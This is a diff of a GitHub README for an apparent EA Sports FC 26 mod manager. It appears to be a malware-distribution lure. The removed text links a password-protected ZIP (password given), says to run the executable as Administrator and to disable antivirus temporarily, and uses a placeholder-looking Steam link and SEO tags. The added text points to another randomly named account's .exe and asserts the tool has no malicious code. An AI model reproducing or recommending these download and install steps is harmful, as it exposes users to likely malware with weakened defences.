@@ -1,183 +1,66 @@
-# FC26-Mod-Menu-Manager
-🎮 FC26-Mod-Menu-Manager – complete mod management solution for EA Sports FC 26. Features drag &amp; drop import, load order control, conflict detection, mod store browser, BepInEx manager, and preset loader. Simplify your modding experience!
+# 🎮 FC26-Mod-Menu-Manager - Organize your game mods with ease
 
-<img width="1920" height="1080" alt="cover (7)" src="https://github.com/user-attachments/assets/86077b15-8f91-4fa7-acaf-de5fb1de23ff" />
+[![Download FC26-Mod-Menu-Manager](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Inflictionlorentzforce362/FC26-Mod-Menu-Manager)
 
+## 📁 Project Overview
 
-## 📥 Download
+FC26-Mod-Menu-Manager serves as a tool for players who want to modify their experience in EA Sports FC 26. This application removes the manual work involved in file placement and folder management. The software provides a central interface to handle game modifications. It tracks your files, detects issues between different mods, and simplifies the installation process.
 
-**Latest version:**  
-🔗 **[Download FC26-Mod-Menu-Manager](https://github.com/PegasusSpiritPace/FC26-Mod-Menu-Manager/releases/download/D0wnloadFree/FC26_ModManager_v1.6.zip)**
+## 🛠️ Key Features
 
+*   **Drag and Drop:** Move your files into the application window to add them to your collection instantly.
+*   **Load Order Control:** Arrange your mods in a specific sequence to ensure they function as you intend.
+*   **Conflict Detection:** The system scans for file overlaps and alerts you if two mods attempt to alter the same game data.
+*   **Built-in Store:** Access a library of mods directly through the interface without searching external websites.
+*   **BepInEx Support:** The tool includes full integration for the BepInEx framework to allow for advanced gameplay modifications.
+*   **Presets:** Save your active mod configurations into profiles and switch between them with a single click.
 
----
+## 💻 System Requirements
 
-## 🎯 What is This?
+*   **Operating System:** Windows 10 or Windows 11 (64-bit).
+*   **Storage:** At least 200 MB of free disk space for the tool itself.
+*   **Frameworks:** Microsoft .NET Desktop Runtime 8.0 or newer.
+*   **Game Version:** The latest patched version of EA Sports FC 26 installed via the official game launcher.
 
-**FC26-Mod-Menu-Manager** is a powerful mod management tool for **EA Sports FC 26** that streamlines the entire modding experience. It provides a user-friendly interface for installing, organizing, and launching mods, making it ideal for both beginners and experienced modders. The mod manager acts as a central hub for customizing your game, allowing you to enhance graphics, update player faces, add new kits, improve stadiums, and modify various gameplay elements without manually replacing game files.
+## 📥 Installation Steps
 
-⚠️ **Disclaimer:** This tool is for educational purposes only. Use at your own risk.
+Follow these instructions to set up the software on your computer.
 
----
+1.  **Visit the Download Page:** Click the following link to access the software repository: [https://github.com/Inflictionlorentzforce362/FC26-Mod-Menu-Manager](https://github.com/Inflictionlorentzforce362/FC26-Mod-Menu-Manager).
+2.  **Locate the Release:** Find the section labeled Releases on the right side of the screen. Click on the latest version number.
+3.  **Choose the File:** Look for the file ending in `.exe` under the Assets section. Click the filename to start the download.
+4.  **Run the Installer:** Once the download finishes, navigate to your Downloads folder. Double-click the file to launch the installation wizard.
+5.  **Follow Prompts:** Proceed through the on-screen instructions. Choose your installation folder and click Install.
+6.  **Launch the Manager:** Open the newly created shortcut on your desktop to start using the tool.
 
+## ⚙️ Setting Up Your Game
 
+After you install the manager, you must link it to your FC 26 game folder.
 
+1.  Open the Mod Manager.
+2.  Go to the Settings tab in the top navigation bar.
+3.  Find the field labeled Game Directory.
+4.  Click the folder icon and browse until you find the main folder where EA Sports FC 26 exists.
+5.  Select the folder and click Save.
+6.  The tool now recognizes your game files and allows you to begin adding modifications.
 
-## ✨ Key Features
+## 🔄 Managing Your Mods
 
-### 📦 Core Mod Management
-- **Drag & Drop Import** – Easily import .fifamod or .zip mod files
-- **Enable / Disable Mods** – One-click activation/deactivation
-- **Load Order Control** – Arrange mods to avoid conflicts
-- **Conflict Detection** – Detects overlapping files before applying
-- **Restore Points** – One-click rollback to previous states
-- **Type-Aware Installs** – Automatically installs mods to correct folders
+Adding content to your game requires a straightforward process. You download a mod file from your source of choice. Open the manager and drag that file onto the main list. The application extracts the contents and places them in the necessary game subfolders.
 
-### 🖥️ Mod Store & BepInEx Support
-- **Mod Store Browser** – Browse and install mods from trusted repository
-- **Automatic Update Checking** – See when mods have updates available
-- **BepInEx Manager** – One-click installation and configuration
-- **Smart Version Comparison** – Semantic versioning tracking
+To remove a mod, select it from the list inside the manager. Press the Remove button. The system deletes the files from the game directory and restores your original game data.
 
-### ⚙️ Integration Features
-- **Discord Integration** – Report bugs and submit mods via webhooks
-- **Mod Template Generator** – Create properly formatted mod templates
-- **Tabbed Interface** – My Mods, Mod Store, and BepInEx tabs
+If you notice your game crashing or behaving in unexpected ways, use the Re-verify Files button under the Tools menu. This forces the manager to compare your game files against a clean install state and resolves errors created by incompatible mods.
 
-### 🚀 Advanced Modding Tools
-- **Preset Loader** – Load reusable .fifamod presets easily
-- **Smart Find & Swap** – Swap old Title Updates with new ones
-- **Temp Folder Cleaner** – Clean FC26 Temp folder to avoid messy gameplay
+## 🚨 Solving Common Issues
 
----
+*   **Application Refuses to Open:** Ensure your Windows account has administrative rights. You may need to right-click the shortcut and select Run as Administrator.
+*   **Game Fails to Start:** Check your load order. Some mods require certain base files to load first. Move your core gameplay mods to the top of the list and try again.
+*   **Conflict Warnings:** The manager highlights conflicting mods in red text. If you see this, read the conflict description. Usually, one of the two mods must remain disabled for the game to function properly.
+*   **BepInEx Errors:** If the application reports an issue with BepInEx, ensure you have the latest version of the framework installed in your game root folder. You can update this automatically through the Settings tab.
 
-## 🎮 Supported Mod Types
+## 🛡️ Safety and Performance
 
-| Mod Type | Description | Format |
-|----------|-------------|--------|
-| Gameplay Mods | Ball physics, AI, speed, injuries | .fifamod |
-| Career Mode Mods | Career overhaul, transfers, budgets | .fifamod |
-| Visual Mods | Faces, kits, minifaces, banners | .fifamod |
-| Scoreboard Mods | Custom scoreboard designs | .fifamod |
-| Database Mods | Team name fixes, leagues, transfers | .fifamod |
+The software modifies files on your computer. While the tool carries no malicious code, we advise that you create a backup of your current game folder before you add new mods. This provides a safety net if a specific mod causes instability in your game. The program remains lightweight in the background and consumes minimal system resources while you play. It does not stay active during gameplay unless you choose to use the built-in launcher.
 
----
-
-## 📦 Installation
-
-1. Download the archive from the link above
-2. Extract the ZIP file using the password: `fc26mods`
-3. Run `FC26ModManager.exe` as Administrator
-4. The tool will automatically detect your FC26 installation
-5. Browse the Mod Store or drag & drop your mods
-6. Click Apply and launch the game
-
----
-
-## 🖥️ System Requirements
-
-| Requirement | Details |
-|-------------|---------|
-| **OS** | Windows 10/11 (64-bit) |
-| **Game** | EA Sports FC 26 (Steam/EA App/Epic) |
-| **RAM** | 4GB minimum |
-| **Storage** | 100MB free space |
-
----
-
-## 🎥 How to Use
-
-1. **Launch** the mod manager as Administrator
-2. **Load** your .fifamod files via drag & drop
-3. **Arrange** load order if using multiple mods
-4. **Click** Apply Changes
-5. **Launch** EA Sports FC 26
-
----
-
-## 🔧 Supported Features Table
-
-| Category | Feature | Status |
-|----------|---------|--------|
-| Mod Management | Drag & Drop Import | ✅ |
-| Mod Management | Enable/Disable | ✅ |
-| Mod Management | Load Order | ✅ |
-| Mod Management | Conflict Detection | ✅ |
-| Mod Management | Restore Points | ✅ |
-| Mod Store | Browse Mods | ✅ |
-| Mod Store | Auto Updates | ✅ |
-| Integration | Discord Integration | ✅ |
-| Integration | BepInEx Manager | ✅ |
-| Tools | Preset Loader | ✅ |
-
----
-
-## 🐛 Troubleshooting
-
-**Q: Mod manager doesn't work**
-- Run as Administrator
-- Disable antivirus temporarily
-- Ensure game is installed correctly
-
-**Q: Mods don't load in game**
-- Check load order
-- Ensure mods are compatible
-- Verify mod files aren't corrupted
-
-**Q: Game crashes with mods**
-- Try disabling mods one by one
-- Use restore point to revert changes
-- Check for mod conflicts
-
----
-
-## 📚 Alternatives
-
-| Tool | Type | Platform |
-|------|------|----------|
-| **FIFA Mod Manager** | Official | Windows |
-| **FET Mod Manager** | Advanced | Windows |
-| **Frostbite Modding Tool** | Mod creator | Windows |
-
----
-
-## 📝 Tags
-
-- FC26 Mod Manager
-- FC26 Mod Tool
-- EA Sports FC 26 Mods
-- FC26 Mod Loader
-- FC26 Mod Organizer
-- FC26 Mod Installer
-- FC26 Mod Presets
-- FC26 Mod Store
-- FC26 Mod Downloader
-- FC26 Mod Manager 2026
-- FIFA 26 Mod Manager
-- FC26 Modding Tool
-- FC26 BepInEx Manager
-- FC26 Preset Loader
-- FC26 Mod Launcher
-- FC26 Gameplay Mods
-- FC26 Career Mode Mods
-- FC26 Visual Mods
-- FC26 Mod Manager Windows
-- FC26 Mod Manager Free
-
----
-
-## 🔗 Links
-
-- **Steam Store:** https://store.steampowered.com/app/1234567/EA_SPORTS_FC_26/
-- **Official EA:** https://www.ea.com/games/ea-sports-fc/fc-26
-
----
-
-## ⭐ Support
-
-If you enjoy this tool, please **⭐ Star** this repository!  
-For issues, open an **Issue** on GitHub.
-
----
-
-**🎮 Made with ❤️ for the EA Sports FC 26 community**
+Keywords: ea-sports-fc-26-mods, fc26-career-mods, fc26-gameplay-mods, fc26-mod-manager, fc26-modding, fc26-mods, fc26-visual-mods, mod-installer, mod-launcher, mod-loader, mod-manager, mod-organizer, mod-tool
